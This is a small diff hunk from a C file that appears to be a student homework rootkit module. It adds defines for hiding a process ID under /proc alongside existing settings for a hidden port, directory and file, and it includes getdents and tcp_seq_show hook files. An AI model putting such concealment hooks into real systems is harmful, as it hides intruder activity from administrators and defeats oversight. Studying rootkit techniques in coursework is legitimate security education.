@@ -25,6 +25,8 @@
 #define HIDDEN_PORT 8080
 #define HIDDEN_FILE_DIR "/home/student/projects/hw"
 #define HIDDEN_FILE_NAME "myfile"
+#define PROC_PATH "/proc"
+#define HIDDEN_PID "108190"
 
 #include "hook_functions/tcp_seq_show.c"
 #include "hook_functions/getdents.c"
